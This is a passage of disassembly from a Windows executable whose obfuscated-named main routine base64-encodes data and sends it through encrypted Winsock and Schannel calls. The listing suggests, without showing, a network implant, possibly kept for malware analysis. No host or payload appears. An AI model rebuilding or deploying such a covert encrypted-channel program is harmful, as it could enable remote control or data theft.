   1400026c9:	48 85 c0             	test   %rax,%rax
   1400026cc:	0f 84 9a fc ff ff    	je     14000236c <g9_2_2lthb4+0x62c>
   1400026d2:	4c 8b 54 24 68       	mov    0x68(%rsp),%r10
   1400026d7:	41 89 f1             	mov    %esi,%r9d
   1400026da:	c7 84 24 34 01 00 00 	movl   $0x7,0x134(%rsp)
   1400026e1:	07 00 00 00 
   1400026e5:	4a 8d 0c 08          	lea    (%rax,%r9,1),%rcx
   1400026e9:	89 b4 24 30 01 00 00 	mov    %esi,0x130(%rsp)
   1400026f0:	44 8b 84 24 8c 00 00 	mov    0x8c(%rsp),%r8d
   1400026f7:	00 
   1400026f8:	41 83 fa 08          	cmp    $0x8,%r10d
   1400026fc:	48 89 84 24 38 01 00 	mov    %rax,0x138(%rsp)
   140002703:	00 
   140002704:	c7 84 24 44 01 00 00 	movl   $0x1,0x144(%rsp)
   14000270b:	01 00 00 00 
   14000270f:	44 89 94 24 40 01 00 	mov    %r10d,0x140(%rsp)
   140002716:	00 
   140002717:	48 89 8c 24 48 01 00 	mov    %rcx,0x148(%rsp)
   14000271e:	00 
   14000271f:	0f 83 55 01 00 00    	jae    14000287a <g9_2_2lthb4+0xb3a>
   140002725:	41 f6 c2 04          	test   $0x4,%r10b
   140002729:	0f 85 30 01 00 00    	jne    14000285f <g9_2_2lthb4+0xb1f>
   14000272f:	45 85 d2             	test   %r10d,%r10d
   140002732:	74 16                	je     14000274a <g9_2_2lthb4+0xa0a>
   140002734:	44 0f b6 9c 24 d0 09 	movzbl 0x9d0(%rsp),%r11d
   14000273b:	00 00 
   14000273d:	44 88 19             	mov    %r11b,(%rcx)
   140002740:	41 f6 c2 02          	test   $0x2,%r10b
   140002744:	0f 85 02 01 00 00    	jne    14000284c <g9_2_2lthb4+0xb0c>
   14000274a:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   14000274f:	4f 8d 14 0a          	lea    (%r10,%r9,1),%r10
   140002753:	4c 8b 0d f6 8a 00 00 	mov    0x8af6(%rip),%r9        # 14000b250 <base64_chars+0x50>
   14000275a:	31 d2                	xor    %edx,%edx
   14000275c:	44 89 84 24 50 01 00 	mov    %r8d,0x150(%rsp)
   140002763:	00 
   140002764:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   140002769:	4d 01 ea             	add    %r13,%r10
   14000276c:	48 89 8c 24 f8 00 00 	mov    %rcx,0xf8(%rsp)
   140002773:	00 
   140002774:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002779:	4c 89 8c 24 f0 00 00 	mov    %r9,0xf0(%rsp)
   140002780:	00 
   140002781:	45 31 c9             	xor    %r9d,%r9d
   140002784:	c7 84 24 54 01 00 00 	movl   $0x6,0x154(%rsp)
   14000278b:	06 00 00 00 
   14000278f:	4c 89 94 24 58 01 00 	mov    %r10,0x158(%rsp)
   140002796:	00 
   140002797:	e8 a4 01 00 00       	call   140002940 <EncryptMessage>
   14000279c:	85 c0                	test   %eax,%eax
   14000279e:	0f 84 8c 00 00 00    	je     140002830 <g9_2_2lthb4+0xaf0>
   1400027a4:	4c 89 e9             	mov    %r13,%rcx
   1400027a7:	e8 0c 6c 00 00       	call   1400093b8 <free>
   1400027ac:	e9 bb fb ff ff       	jmp    14000236c <g9_2_2lthb4+0x62c>
   1400027b1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400027b8:	4c 8b 9c 24 30 02 00 	mov    0x230(%rsp),%r11
   1400027bf:	00 
   1400027c0:	89 d7                	mov    %edx,%edi
   1400027c2:	4c 89 19             	mov    %r11,(%rcx)
   1400027c5:	4c 8b 4c 3e f8       	mov    -0x8(%rsi,%rdi,1),%r9
   1400027ca:	4c 89 4c 39 f8       	mov    %r9,-0x8(%rcx,%rdi,1)
   1400027cf:	48 8d 79 08          	lea    0x8(%rcx),%rdi
   1400027d3:	48 83 e7 f8          	and    $0xfffffffffffffff8,%rdi
   1400027d7:	48 29 f9             	sub    %rdi,%rcx
   1400027da:	48 29 ce             	sub    %rcx,%rsi
   1400027dd:	01 d1                	add    %edx,%ecx
   1400027df:	c1 e9 03             	shr    $0x3,%ecx
   1400027e2:	f3 48 a5             	rep movsq %ds:(%rsi),%es:(%rdi)
   1400027e5:	e9 ed fc ff ff       	jmp    1400024d7 <g9_2_2lthb4+0x797>
   1400027ea:	48 89 c1             	mov    %rax,%rcx
   1400027ed:	e8 c6 6b 00 00       	call   1400093b8 <free>
   1400027f2:	e9 75 fb ff ff       	jmp    14000236c <g9_2_2lthb4+0x62c>
   1400027f7:	8b bc 24 30 02 00 00 	mov    0x230(%rsp),%edi
   1400027fe:	41 89 d1             	mov    %edx,%r9d
   140002801:	89 39                	mov    %edi,(%rcx)
   140002803:	42 8b 74 0e fc       	mov    -0x4(%rsi,%r9,1),%esi
   140002808:	42 89 74 09 fc       	mov    %esi,-0x4(%rcx,%r9,1)
   14000280d:	e9 c5 fc ff ff       	jmp    1400024d7 <g9_2_2lthb4+0x797>
   140002812:	89 d7                	mov    %edx,%edi
   140002814:	44 0f b7 4c 3e fe    	movzwl -0x2(%rsi,%rdi,1),%r9d
   14000281a:	66 44 89 4c 39 fe    	mov    %r9w,-0x2(%rcx,%rdi,1)
   140002820:	e9 b2 fc ff ff       	jmp    1400024d7 <g9_2_2lthb4+0x797>
   140002825:	41 bb 02 00 00 00    	mov    $0x2,%r11d
   14000282b:	e9 1d fe ff ff       	jmp    14000264d <g9_2_2lthb4+0x90d>
   140002830:	45 89 f8             	mov    %r15d,%r8d
   140002833:	45 31 c9             	xor    %r9d,%r9d
   140002836:	4c 89 ea             	mov    %r13,%rdx
   140002839:	48 89 e9             	mov    %rbp,%rcx
   14000283c:	4c 8b bc 24 80 00 00 	mov    0x80(%rsp),%r15
   140002843:	00 
   140002844:	41 ff d7             	call   *%r15
   140002847:	e9 58 ff ff ff       	jmp    1400027a4 <g9_2_2lthb4+0xa64>
   14000284c:	44 89 d6             	mov    %r10d,%esi
   14000284f:	41 0f b7 54 36 fe    	movzwl -0x2(%r14,%rsi,1),%edx
   140002855:	66 89 54 31 fe       	mov    %dx,-0x2(%rcx,%rsi,1)
   14000285a:	e9 eb fe ff ff       	jmp    14000274a <g9_2_2lthb4+0xa0a>
   14000285f:	8b 84 24 d0 09 00 00 	mov    0x9d0(%rsp),%eax
   140002866:	44 89 d7             	mov    %r10d,%edi
   140002869:	89 01                	mov    %eax,(%rcx)
   14000286b:	45 8b 74 3e fc       	mov    -0x4(%r14,%rdi,1),%r14d
   140002870:	44 89 74 39 fc       	mov    %r14d,-0x4(%rcx,%rdi,1)
   140002875:	e9 d0 fe ff ff       	jmp    14000274a <g9_2_2lthb4+0xa0a>
   14000287a:	48 8b 84 24 d0 09 00 	mov    0x9d0(%rsp),%rax
   140002881:	00 
   140002882:	44 89 d7             	mov    %r10d,%edi
   140002885:	4c 89 f6             	mov    %r14,%rsi
   140002888:	48 89 01             	mov    %rax,(%rcx)
   14000288b:	4d 8b 5c 3e f8       	mov    -0x8(%r14,%rdi,1),%r11
   140002890:	4c 89 5c 39 f8       	mov    %r11,-0x8(%rcx,%rdi,1)
   140002895:	48 8d 79 08          	lea    0x8(%rcx),%rdi
   140002899:	48 83 e7 f8          	and    $0xfffffffffffffff8,%rdi
   14000289d:	48 29 f9             	sub    %rdi,%rcx
   1400028a0:	48 29 ce             	sub    %rcx,%rsi
   1400028a3:	44 01 d1             	add    %r10d,%ecx
   1400028a6:	c1 e9 03             	shr    $0x3,%ecx
   1400028a9:	f3 48 a5             	rep movsq %ds:(%rsi),%es:(%rdi)
   1400028ac:	e9 99 fe ff ff       	jmp    14000274a <g9_2_2lthb4+0xa0a>
   1400028b1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400028b8:	00 00 00 00 
   1400028bc:	0f 1f 40 00          	nopl   0x0(%rax)

00000001400028c0 <WinMain>:
   1400028c0:	e9 7b f4 ff ff       	jmp    140001d40 <g9_2_2lthb4>
   1400028c5:	90                   	nop
   1400028c6:	90                   	nop
   1400028c7:	90                   	nop
   1400028c8:	90                   	nop
   1400028c9:	90                   	nop
   1400028ca:	90                   	nop
   1400028cb:	90                   	nop
   1400028cc:	90                   	nop
   1400028cd:	90                   	nop
   1400028ce:	90                   	nop
   1400028cf:	90                   	nop

00000001400028d0 <socket>:
   1400028d0:	ff 25 72 dc 00 00    	jmp    *0xdc72(%rip)        # 140010548 <__imp_socket>
   1400028d6:	90                   	nop
   1400028d7:	90                   	nop

00000001400028d8 <send>:
   1400028d8:	ff 25 62 dc 00 00    	jmp    *0xdc62(%rip)        # 140010540 <__imp_send>
   1400028de:	90                   	nop
   1400028df:	90                   	nop

00000001400028e0 <recv>:
   1400028e0:	ff 25 52 dc 00 00    	jmp    *0xdc52(%rip)        # 140010538 <__imp_recv>
   1400028e6:	90                   	nop
   1400028e7:	90                   	nop

00000001400028e8 <htons>:
   1400028e8:	ff 25 42 dc 00 00    	jmp    *0xdc42(%rip)        # 140010530 <__imp_htons>
   1400028ee:	90                   	nop
   1400028ef:	90                   	nop

00000001400028f0 <gethostbyname>:
   1400028f0:	ff 25 32 dc 00 00    	jmp    *0xdc32(%rip)        # 140010528 <__imp_gethostbyname>
   1400028f6:	90                   	nop
   1400028f7:	90                   	nop

00000001400028f8 <connect>:
   1400028f8:	ff 25 22 dc 00 00    	jmp    *0xdc22(%rip)        # 140010520 <__imp_connect>
   1400028fe:	90                   	nop
   1400028ff:	90                   	nop

0000000140002900 <closesocket>:
   140002900:	ff 25 12 dc 00 00    	jmp    *0xdc12(%rip)        # 140010518 <__imp_closesocket>
   140002906:	90                   	nop
   140002907:	90                   	nop

0000000140002908 <WSAStartup>:
   140002908:	ff 25 02 dc 00 00    	jmp    *0xdc02(%rip)        # 140010510 <__imp_WSAStartup>
   14000290e:	90                   	nop
   14000290f:	90                   	nop

0000000140002910 <WSACleanup>:
   140002910:	ff 25 f2 db 00 00    	jmp    *0xdbf2(%rip)        # 140010508 <__imp_WSACleanup>
   140002916:	90                   	nop
   140002917:	90                   	nop
   140002918:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000291f:	00 

0000000140002920 <QueryContextAttributesA>:
   140002920:	ff 25 d2 db 00 00    	jmp    *0xdbd2(%rip)        # 1400104f8 <__imp_QueryContextAttributesA>
   140002926:	90                   	nop
   140002927:	90                   	nop

0000000140002928 <InitializeSecurityContextA>:
   140002928:	ff 25 c2 db 00 00    	jmp    *0xdbc2(%rip)        # 1400104f0 <__imp_InitializeSecurityContextA>
   14000292e:	90                   	nop
   14000292f:	90                   	nop

0000000140002930 <FreeCredentialsHandle>:
   140002930:	ff 25 b2 db 00 00    	jmp    *0xdbb2(%rip)        # 1400104e8 <__imp_FreeCredentialsHandle>
   140002936:	90                   	nop
   140002937:	90                   	nop

0000000140002938 <FreeContextBuffer>:
   140002938:	ff 25 a2 db 00 00    	jmp    *0xdba2(%rip)        # 1400104e0 <__imp_FreeContextBuffer>
   14000293e:	90                   	nop
   14000293f:	90                   	nop

0000000140002940 <EncryptMessage>:
   140002940:	ff 25 92 db 00 00    	jmp    *0xdb92(%rip)        # 1400104d8 <__imp_EncryptMessage>
   140002946:	90                   	nop
   140002947:	90                   	nop

0000000140002948 <DeleteSecurityContext>:
   140002948:	ff 25 82 db 00 00    	jmp    *0xdb82(%rip)        # 1400104d0 <__imp_DeleteSecurityContext>
   14000294e:	90                   	nop
   14000294f:	90                   	nop

0000000140002950 <DecryptMessage>:
   140002950:	ff 25 72 db 00 00    	jmp    *0xdb72(%rip)        # 1400104c8 <__imp_DecryptMessage>
   140002956:	90                   	nop
   140002957:	90                   	nop

0000000140002958 <AcquireCredentialsHandleA>:
   140002958:	ff 25 62 db 00 00    	jmp    *0xdb62(%rip)        # 1400104c0 <__imp_AcquireCredentialsHandleA>
   14000295e:	90                   	nop
   14000295f:	90                   	nop

0000000140002960 <__do_global_dtors>:
   140002960:	48 83 ec 28          	sub    $0x28,%rsp
   140002964:	48 8b 05 95 76 00 00 	mov    0x7695(%rip),%rax        # 14000a000 <__data_start__>
   14000296b:	48 8b 00             	mov    (%rax),%rax
   14000296e:	48 85 c0             	test   %rax,%rax
   140002971:	74 22                	je     140002995 <__do_global_dtors+0x35>
   140002973:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002978:	ff d0                	call   *%rax
   14000297a:	48 8b 05 7f 76 00 00 	mov    0x767f(%rip),%rax        # 14000a000 <__data_start__>
   140002981:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140002985:	48 8b 40 08          	mov    0x8(%rax),%rax
   140002989:	48 89 15 70 76 00 00 	mov    %rdx,0x7670(%rip)        # 14000a000 <__data_start__>
   140002990:	48 85 c0             	test   %rax,%rax
   140002993:	75 e3                	jne    140002978 <__do_global_dtors+0x18>
   140002995:	48 83 c4 28          	add    $0x28,%rsp
   140002999:	c3                   	ret
   14000299a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000001400029a0 <__do_global_ctors>:
   1400029a0:	56                   	push   %rsi
   1400029a1:	53                   	push   %rbx
   1400029a2:	48 83 ec 28          	sub    $0x28,%rsp
   1400029a6:	48 8b 15 b3 8f 00 00 	mov    0x8fb3(%rip),%rdx        # 14000b960 <.refptr.__CTOR_LIST__>
   1400029ad:	48 8b 02             	mov    (%rdx),%rax
   1400029b0:	89 c1                	mov    %eax,%ecx
   1400029b2:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400029b5:	74 39                	je     1400029f0 <__do_global_ctors+0x50>
   1400029b7:	85 c9                	test   %ecx,%ecx
   1400029b9:	74 20                	je     1400029db <__do_global_ctors+0x3b>
   1400029bb:	89 c8                	mov    %ecx,%eax
   1400029bd:	83 e9 01             	sub    $0x1,%ecx
   1400029c0:	48 8d 1c c2          	lea    (%rdx,%rax,8),%rbx
   1400029c4:	48 29 c8             	sub    %rcx,%rax
   1400029c7:	48 8d 74 c2 f8       	lea    -0x8(%rdx,%rax,8),%rsi
   1400029cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400029d0:	ff 13                	call   *(%rbx)
   1400029d2:	48 83 eb 08          	sub    $0x8,%rbx
   1400029d6:	48 39 f3             	cmp    %rsi,%rbx
   1400029d9:	75 f5                	jne    1400029d0 <__do_global_ctors+0x30>
   1400029db:	48 8d 0d 7e ff ff ff 	lea    -0x82(%rip),%rcx        # 140002960 <__do_global_dtors>
   1400029e2:	48 83 c4 28          	add    $0x28,%rsp
   1400029e6:	5b                   	pop    %rbx
   1400029e7:	5e                   	pop    %rsi
   1400029e8:	e9 23 ea ff ff       	jmp    140001410 <atexit>
   1400029ed:	0f 1f 00             	nopl   (%rax)
   1400029f0:	31 c0                	xor    %eax,%eax
   1400029f2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400029f8:	44 8d 40 01          	lea    0x1(%rax),%r8d
   1400029fc:	89 c1                	mov    %eax,%ecx
   1400029fe:	4a 83 3c c2 00       	cmpq   $0x0,(%rdx,%r8,8)
   140002a03:	4c 89 c0             	mov    %r8,%rax
   140002a06:	75 f0                	jne    1400029f8 <__do_global_ctors+0x58>
   140002a08:	eb ad                	jmp    1400029b7 <__do_global_ctors+0x17>
   140002a0a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000140002a10 <__main>:
   140002a10:	8b 05 1a c6 00 00    	mov    0xc61a(%rip),%eax        # 14000f030 <initialized>
   140002a16:	85 c0                	test   %eax,%eax
   140002a18:	74 06                	je     140002a20 <__main+0x10>
   140002a1a:	c3                   	ret
   140002a1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002a20:	c7 05 06 c6 00 00 01 	movl   $0x1,0xc606(%rip)        # 14000f030 <initialized>
   140002a27:	00 00 00 
   140002a2a:	e9 71 ff ff ff       	jmp    1400029a0 <__do_global_ctors>
   140002a2f:	90                   	nop

0000000140002a30 <_setargv>:
   140002a30:	31 c0                	xor    %eax,%eax
   140002a32:	c3                   	ret
   140002a33:	90                   	nop
   140002a34:	90                   	nop
   140002a35:	90                   	nop
   140002a36:	90                   	nop
   140002a37:	90                   	nop
   140002a38:	90                   	nop
   140002a39:	90                   	nop
   140002a3a:	90                   	nop
   140002a3b:	90                   	nop
   140002a3c:	90                   	nop
   140002a3d:	90                   	nop
   140002a3e:	90                   	nop
   140002a3f:	90                   	nop

0000000140002a40 <__dyn_tls_dtor>:
   140002a40:	48 83 ec 28          	sub    $0x28,%rsp
   140002a44:	83 fa 03             	cmp    $0x3,%edx
   140002a47:	74 17                	je     140002a60 <__dyn_tls_dtor+0x20>
   140002a49:	85 d2                	test   %edx,%edx
   140002a4b:	74 13                	je     140002a60 <__dyn_tls_dtor+0x20>
   140002a4d:	b8 01 00 00 00       	mov    $0x1,%eax
   140002a52:	48 83 c4 28          	add    $0x28,%rsp
   140002a56:	c3                   	ret
   140002a57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002a5e:	00 00 
   140002a60:	e8 8b 0a 00 00       	call   1400034f0 <__mingw_TLScallback>
   140002a65:	b8 01 00 00 00       	mov    $0x1,%eax
   140002a6a:	48 83 c4 28          	add    $0x28,%rsp
   140002a6e:	c3                   	ret
   140002a6f:	90                   	nop

0000000140002a70 <__dyn_tls_init>:
   140002a70:	56                   	push   %rsi
   140002a71:	53                   	push   %rbx
   140002a72:	48 83 ec 28          	sub    $0x28,%rsp
   140002a76:	48 8b 05 c3 8e 00 00 	mov    0x8ec3(%rip),%rax        # 14000b940 <.refptr._CRT_MT>
   140002a7d:	83 38 02             	cmpl   $0x2,(%rax)
   140002a80:	74 06                	je     140002a88 <__dyn_tls_init+0x18>
   140002a82:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   140002a88:	83 fa 02             	cmp    $0x2,%edx
   140002a8b:	74 13                	je     140002aa0 <__dyn_tls_init+0x30>
   140002a8d:	83 fa 01             	cmp    $0x1,%edx
   140002a90:	74 4e                	je     140002ae0 <__dyn_tls_init+0x70>
   140002a92:	b8 01 00 00 00       	mov    $0x1,%eax
   140002a97:	48 83 c4 28          	add    $0x28,%rsp
   140002a9b:	5b                   	pop    %rbx
   140002a9c:	5e                   	pop    %rsi
   140002a9d:	c3                   	ret
   140002a9e:	66 90                	xchg   %ax,%ax
   140002aa0:	48 8d 1d b1 e5 00 00 	lea    0xe5b1(%rip),%rbx        # 140011058 <__xd_z>
   140002aa7:	48 8d 35 aa e5 00 00 	lea    0xe5aa(%rip),%rsi        # 140011058 <__xd_z>
   140002aae:	48 39 f3             	cmp    %rsi,%rbx
   140002ab1:	74 df                	je     140002a92 <__dyn_tls_init+0x22>
   140002ab3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002ab8:	48 8b 03             	mov    (%rbx),%rax
   140002abb:	48 85 c0             	test   %rax,%rax
   140002abe:	74 02                	je     140002ac2 <__dyn_tls_init+0x52>
   140002ac0:	ff d0                	call   *%rax
   140002ac2:	48 83 c3 08          	add    $0x8,%rbx
   140002ac6:	48 39 f3             	cmp    %rsi,%rbx
   140002ac9:	75 ed                	jne    140002ab8 <__dyn_tls_init+0x48>
   140002acb:	b8 01 00 00 00       	mov    $0x1,%eax
   140002ad0:	48 83 c4 28          	add    $0x28,%rsp
   140002ad4:	5b                   	pop    %rbx
   140002ad5:	5e                   	pop    %rsi
   140002ad6:	c3                   	ret
   140002ad7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002ade:	00 00 
   140002ae0:	e8 0b 0a 00 00       	call   1400034f0 <__mingw_TLScallback>
   140002ae5:	b8 01 00 00 00       	mov    $0x1,%eax
   140002aea:	48 83 c4 28          	add    $0x28,%rsp
   140002aee:	5b                   	pop    %rbx
   140002aef:	5e                   	pop    %rsi
   140002af0:	c3                   	ret
   140002af1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002af8:	00 00 00 00 
   140002afc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140002b00 <__tlregdtor>:
   140002b00:	31 c0                	xor    %eax,%eax
   140002b02:	c3                   	ret
   140002b03:	90                   	nop
   140002b04:	90                   	nop
   140002b05:	90                   	nop
   140002b06:	90                   	nop
   140002b07:	90                   	nop
   140002b08:	90                   	nop
   140002b09:	90                   	nop
   140002b0a:	90                   	nop
   140002b0b:	90                   	nop
   140002b0c:	90                   	nop
   140002b0d:	90                   	nop
   140002b0e:	90                   	nop
   140002b0f:	90                   	nop

0000000140002b10 <_matherr>:
   140002b10:	56                   	push   %rsi
   140002b11:	53                   	push   %rbx
   140002b12:	48 83 ec 78          	sub    $0x78,%rsp
   140002b16:	0f 11 74 24 40       	movups %xmm6,0x40(%rsp)
   140002b1b:	0f 11 7c 24 50       	movups %xmm7,0x50(%rsp)
   140002b20:	44 0f 11 44 24 60    	movups %xmm8,0x60(%rsp)
   140002b26:	83 39 06             	cmpl   $0x6,(%rcx)
   140002b29:	0f 87 cd 00 00 00    	ja     140002bfc <_matherr+0xec>
   140002b2f:	8b 01                	mov    (%rcx),%eax
   140002b31:	48 8d 15 cc 88 00 00 	lea    0x88cc(%rip),%rdx        # 14000b404 <.rdata+0x124>
   140002b38:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140002b3c:	48 01 d0             	add    %rdx,%rax
   140002b3f:	ff e0                	jmp    *%rax
   140002b41:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002b48:	48 8d 1d b0 87 00 00 	lea    0x87b0(%rip),%rbx        # 14000b2ff <.rdata+0x1f>
   140002b4f:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
   140002b55:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
   140002b5a:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
   140002b5f:	48 8b 71 08          	mov    0x8(%rcx),%rsi
   140002b63:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002b68:	e8 93 62 00 00       	call   140008e00 <__acrt_iob_func>
   140002b6d:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
   140002b74:	49 89 d8             	mov    %rbx,%r8
   140002b77:	48 8d 15 5a 88 00 00 	lea    0x885a(%rip),%rdx        # 14000b3d8 <.rdata+0xf8>
   140002b7e:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
   140002b84:	48 89 c1             	mov    %rax,%rcx
   140002b87:	49 89 f1             	mov    %rsi,%r9
   140002b8a:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   140002b90:	e8 13 68 00 00       	call   1400093a8 <fprintf>
   140002b95:	90                   	nop
   140002b96:	0f 10 74 24 40       	movups 0x40(%rsp),%xmm6
   140002b9b:	0f 10 7c 24 50       	movups 0x50(%rsp),%xmm7
   140002ba0:	31 c0                	xor    %eax,%eax
   140002ba2:	44 0f 10 44 24 60    	movups 0x60(%rsp),%xmm8
   140002ba8:	48 83 c4 78          	add    $0x78,%rsp
   140002bac:	5b                   	pop    %rbx
   140002bad:	5e                   	pop    %rsi
   140002bae:	c3                   	ret
   140002baf:	90                   	nop
   140002bb0:	48 8d 1d 29 87 00 00 	lea    0x8729(%rip),%rbx        # 14000b2e0 <.rdata>
   140002bb7:	eb 96                	jmp    140002b4f <_matherr+0x3f>
   140002bb9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002bc0:	48 8d 1d 79 87 00 00 	lea    0x8779(%rip),%rbx        # 14000b340 <.rdata+0x60>
   140002bc7:	eb 86                	jmp    140002b4f <_matherr+0x3f>
   140002bc9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002bd0:	48 8d 1d 49 87 00 00 	lea    0x8749(%rip),%rbx        # 14000b320 <.rdata+0x40>
   140002bd7:	e9 73 ff ff ff       	jmp    140002b4f <_matherr+0x3f>
   140002bdc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002be0:	48 8d 1d a9 87 00 00 	lea    0x87a9(%rip),%rbx        # 14000b390 <.rdata+0xb0>
   140002be7:	e9 63 ff ff ff       	jmp    140002b4f <_matherr+0x3f>
   140002bec:	0f 1f 40 00          	nopl   0x0(%rax)
   140002bf0:	48 8d 1d 71 87 00 00 	lea    0x8771(%rip),%rbx        # 14000b368 <.rdata+0x88>
   140002bf7:	e9 53 ff ff ff       	jmp    140002b4f <_matherr+0x3f>
   140002bfc:	48 8d 1d c3 87 00 00 	lea    0x87c3(%rip),%rbx        # 14000b3c6 <.rdata+0xe6>
   140002c03:	e9 47 ff ff ff       	jmp    140002b4f <_matherr+0x3f>
   140002c08:	90                   	nop
   140002c09:	90                   	nop
   140002c0a:	90                   	nop
   140002c0b:	90                   	nop
   140002c0c:	90                   	nop
   140002c0d:	90                   	nop
   140002c0e:	90                   	nop
   140002c0f:	90                   	nop

0000000140002c10 <_fpreset>:
   140002c10:	db e3                	fninit
   140002c12:	c3                   	ret
   140002c13:	90                   	nop
   140002c14:	90                   	nop
   140002c15:	90                   	nop
   140002c16:	90                   	nop
   140002c17:	90                   	nop
   140002c18:	90                   	nop
   140002c19:	90                   	nop
   140002c1a:	90                   	nop
   140002c1b:	90                   	nop
   140002c1c:	90                   	nop
   140002c1d:	90                   	nop
   140002c1e:	90                   	nop
   140002c1f:	90                   	nop

0000000140002c20 <__report_error>:
   140002c20:	56                   	push   %rsi
   140002c21:	53                   	push   %rbx
   140002c22:	48 83 ec 38          	sub    $0x38,%rsp
   140002c26:	48 89 cb             	mov    %rcx,%rbx
   140002c29:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140002c2e:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002c33:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140002c38:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   140002c3d:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   140002c42:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002c47:	e8 b4 61 00 00       	call   140008e00 <__acrt_iob_func>
   140002c4c:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
   140002c52:	ba 01 00 00 00       	mov    $0x1,%edx
   140002c57:	48 8d 0d c2 87 00 00 	lea    0x87c2(%rip),%rcx        # 14000b420 <.rdata>
   140002c5e:	49 89 c1             	mov    %rax,%r9
   140002c61:	e8 5a 67 00 00       	call   1400093c0 <fwrite>
   140002c66:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   140002c6b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002c70:	e8 8b 61 00 00       	call   140008e00 <__acrt_iob_func>
   140002c75:	48 89 da             	mov    %rbx,%rdx
   140002c78:	48 89 c1             	mov    %rax,%rcx
   140002c7b:	49 89 f0             	mov    %rsi,%r8
   140002c7e:	e8 8d 67 00 00       	call   140009410 <vfprintf>
   140002c83:	e8 08 67 00 00       	call   140009390 <abort>
   140002c88:	90                   	nop
   140002c89:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000140002c90 <mark_section_writable>:
   140002c90:	57                   	push   %rdi
   140002c91:	56                   	push   %rsi
   140002c92:	53                   	push   %rbx
   140002c93:	48 83 ec 50          	sub    $0x50,%rsp
   140002c97:	48 63 35 f6 c3 00 00 	movslq 0xc3f6(%rip),%rsi        # 14000f094 <maxSections>
   140002c9e:	48 89 cb             	mov    %rcx,%rbx
   140002ca1:	85 f6                	test   %esi,%esi
   140002ca3:	0f 8e 17 01 00 00    	jle    140002dc0 <mark_section_writable+0x130>
   140002ca9:	48 8b 05 e8 c3 00 00 	mov    0xc3e8(%rip),%rax        # 14000f098 <the_secs>
   140002cb0:	45 31 c9             	xor    %r9d,%r9d
   140002cb3:	48 83 c0 18          	add    $0x18,%rax
   140002cb7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002cbe:	00 00 
   140002cc0:	4c 8b 00             	mov    (%rax),%r8
   140002cc3:	4c 39 c3             	cmp    %r8,%rbx
   140002cc6:	72 13                	jb     140002cdb <mark_section_writable+0x4b>
   140002cc8:	48 8b 50 08          	mov    0x8(%rax),%rdx
   140002ccc:	8b 52 08             	mov    0x8(%rdx),%edx
   140002ccf:	49 01 d0             	add    %rdx,%r8
   140002cd2:	4c 39 c3             	cmp    %r8,%rbx
   140002cd5:	0f 82 8a 00 00 00    	jb     140002d65 <mark_section_writable+0xd5>
   140002cdb:	41 83 c1 01          	add    $0x1,%r9d
   140002cdf:	48 83 c0 28          	add    $0x28,%rax
   140002ce3:	41 39 f1             	cmp    %esi,%r9d
   140002ce6:	75 d8                	jne    140002cc0 <mark_section_writable+0x30>
   140002ce8:	48 89 d9             	mov    %rbx,%rcx
   140002ceb:	e8 20 0a 00 00       	call   140003710 <__mingw_GetSectionForAddress>
   140002cf0:	48 89 c7             	mov    %rax,%rdi
   140002cf3:	48 85 c0             	test   %rax,%rax
   140002cf6:	0f 84 e6 00 00 00    	je     140002de2 <mark_section_writable+0x152>
   140002cfc:	48 8b 05 95 c3 00 00 	mov    0xc395(%rip),%rax        # 14000f098 <the_secs>
   140002d03:	48 8d 1c b6          	lea    (%rsi,%rsi,4),%rbx
   140002d07:	48 c1 e3 03          	shl    $0x3,%rbx
   140002d0b:	48 01 d8             	add    %rbx,%rax
   140002d0e:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140002d12:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140002d18:	e8 33 0b 00 00       	call   140003850 <_GetPEImageBase>
   140002d1d:	8b 57 0c             	mov    0xc(%rdi),%edx
   140002d20:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   140002d26:	48 8d 0c 10          	lea    (%rax,%rdx,1),%rcx
